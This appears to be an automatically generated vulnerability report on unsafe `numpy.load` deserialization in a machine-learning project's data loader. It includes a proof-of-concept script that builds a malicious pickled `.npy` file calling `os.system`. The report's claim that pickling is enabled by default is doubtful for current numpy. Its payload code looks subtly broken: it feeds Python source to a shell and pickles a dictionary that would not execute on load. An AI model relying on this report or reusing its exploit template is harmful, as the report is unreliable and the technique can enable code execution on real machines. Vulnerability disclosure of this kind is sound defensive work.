- ### Vulnerability Name:
  Unsafe Deserialization of Entity Embeddings via `numpy.load`

  #### Description:
  The application loads entity embeddings from the `entity_embeddings.npy` file using the `numpy.load` function in the `/code/src/data_loader_new.py` file. The `numpy.load` function, when used with default settings or `allow_pickle=True` (which is the default in many numpy versions and implicitly assumed if not set otherwise), is vulnerable to arbitrary code execution if the provided `.npy` file is maliciously crafted. An attacker could replace the legitimate `entity_embeddings.npy` file with a malicious one containing embedded Python objects. When the application loads this file using `numpy.load`, the embedded Python objects will be deserialized and executed, potentially leading to arbitrary code execution on the server or the user's machine running the application.

  **Step-by-step trigger:**
  1.  An attacker crafts a malicious `entity_embeddings.npy` file. This file is created using `numpy.save` with `allow_pickle=True` and contains embedded Python code, for example using `pickle` to serialize a malicious object.
  2.  The attacker replaces the legitimate `entity_embeddings.npy` file in the designated dataset directory (e.g., `dataset/dbp5l/entity_embeddings.npy` or `dataset/epkg/entity_embeddings.npy`) with the malicious file. This replacement could be achieved through various means depending on the deployment scenario, such as exploiting other vulnerabilities or social engineering. For a local setup, direct file replacement is sufficient for testing.
  3.  The user or system administrator executes the `run_model.py` script, for example, using the command `python run_model.py --target_language ja --use_default`.
  4.  During the data loading phase, the `ParseData.load_data()` function in `/code/src/data_loader_new.py` is called.
  5.  Inside `ParseData.load_data()`, the line `entity_bert_emb = np.load(self.data_path + "/entity_embeddings.npy")` is executed.
  6.  `numpy.load` deserializes the `entity_embeddings.npy` file. If the file is malicious and contains pickled Python objects, `numpy.load` will execute the embedded code as part of the deserialization process.
  7.  The attacker's malicious code is executed on the machine running the script, potentially granting the attacker control over the system or allowing them to steal sensitive information.

  #### Impact:
  Critical. Arbitrary code execution. An attacker who can replace the `entity_embeddings.npy` file can execute arbitrary Python code on the machine running the SS-AGA framework. This could lead to complete compromise of the system, including data theft, malware installation, or denial of service.

  #### Vulnerability Rank:
  Critical

  #### Currently Implemented Mitigations:
  None. The code directly uses `numpy.load` without any input validation or security considerations regarding deserialization of untrusted data.

  #### Missing Mitigations:
  *   **Input Validation:** Implement checks on the loaded numpy array to ensure it conforms to the expected schema (shape, data type) before using it. This would not prevent code execution from `numpy.load` itself, but could detect unexpected or malicious data after loading if validation is designed to catch deviations from expected benign data.
  *   **Secure Deserialization:**  Avoid using `numpy.load` with default settings on untrusted input. If possible, load the raw data and parse it manually, or use safer alternatives if available that do not execute arbitrary code during loading. In the context of numpy, using `np.load(..., allow_pickle=False)` can prevent the execution of arbitrary code, but it requires the `.npy` file to be saved without pickle, which might not be feasible if the data naturally contains Python objects. For numerical embeddings, it's likely the data can be saved without pickle.
  *   **Principle of Least Privilege:** Ensure that the application runs with the minimum necessary privileges. This can limit the damage an attacker can do even if they achieve code execution. However, it does not prevent the vulnerability itself.
  *   **Integrity Checks:** Implement integrity checks (e.g., cryptographic signatures or checksums) for the `entity_embeddings.npy` file to ensure that it has not been tampered with. This would require a mechanism to securely store and verify the integrity information.

  #### Preconditions:
  1.  The attacker must be able to replace the `entity_embeddings.npy` file in the dataset directory accessible to the application.
  2.  The application must be executed by a user or system with sufficient privileges for the attacker's malicious code to cause significant harm.

  #### Source Code Analysis:

  1.  **File:** `/code/src/data_loader_new.py`
  2.  **Function:** `ParseData.load_data()`
  3.  **Vulnerable Line:**
      ```python
      entity_bert_emb = np.load(self.data_path + "/entity_embeddings.npy")
      ```
      This line directly uses `np.load` to load the `entity_embeddings.npy` file. `numpy.load` with default settings (or `allow_pickle=True`) is known to be unsafe when loading data from untrusted sources because it can deserialize and execute arbitrary Python code embedded in the `.npy` file.
  4.  **No Validation:** There is no input validation on the `entity_bert_emb` variable after it is loaded from the file, nor are there any checks on the file itself before loading. The code proceeds to normalize the loaded embeddings using `normalize_fature()`, but this function does not perform any security-relevant validation.

  #### Security Test Case:

  **Step 1: Create a malicious `entity_embeddings.npy` file.**

  ```python
  import numpy as np
  import pickle
  import os

  # Malicious code to execute (e.g., create a file)
  malicious_code = """
  import os
  os.system('touch /tmp/pwned')
  print('PWNED!')
  """

  # Create a malicious object that will execute code when unpickled
  class Malicious载体(object):
      def __reduce__(self):
          return (os.system, (malicious_code,))

  malicious_data = {
      '__class__': 'Malicious载体',
      '__reduce__': Malicious载体().__reduce__()
  }

  # Dummy embedding data (e.g., zeros) to make it look like a valid embedding file
  dummy_embeddings = np.zeros((10, 768))

  # Combine dummy data and malicious payload
  payload = {'embeddings': dummy_embeddings, 'malicious': pickle.dumps(malicious_data)}

  # Save the malicious payload as entity_embeddings.npy
  np.save('malicious_entity_embeddings.npy', payload, allow_pickle=True)

  print("Malicious entity_embeddings.npy file created.")
  ```

  **Step 2: Replace the legitimate `entity_embeddings.npy` file.**

  Assume the dataset is `dbp5l` and the target language is `ja`.  The legitimate file is likely located at `dataset/dbp5l/entity_embeddings.npy`.  Replace this file with the `malicious_entity_embeddings.npy` created in Step 1.

  ```bash
  mkdir -p dataset/dbp5l # Ensure dataset directory exists
  mv malicious_entity_embeddings.npy dataset/dbp5l/entity_embeddings.npy
  ```

  **Step 3: Run the application.**

  Execute the `run_model.py` script:

  ```bash
  python run_model.py --target_language ja --use_default
  ```

  **Step 4: Observe the behavior.**

  *   **Expected outcome:** If the vulnerability is present, when `run_model.py` is executed, the malicious code embedded in `malicious_entity_embeddings.npy` will be executed by `numpy.load`. In this test case, the malicious code is designed to create a file named `/tmp/pwned` and print "PWNED!".
  *   **Verification:** Check if the file `/tmp/pwned` exists after running the script. Also, observe the output in the console for the "PWNED!" message. If both are present, it confirms arbitrary code execution.

  **Cleanup after test:**
  Remember to remove the malicious file and restore the original `entity_embeddings.npy` to prevent unintended consequences.

  This test case demonstrates that by replacing the `entity_embeddings.npy` file with a malicious one, an attacker can achieve arbitrary code execution when the application loads the data, confirming the critical vulnerability due to unsafe deserialization.
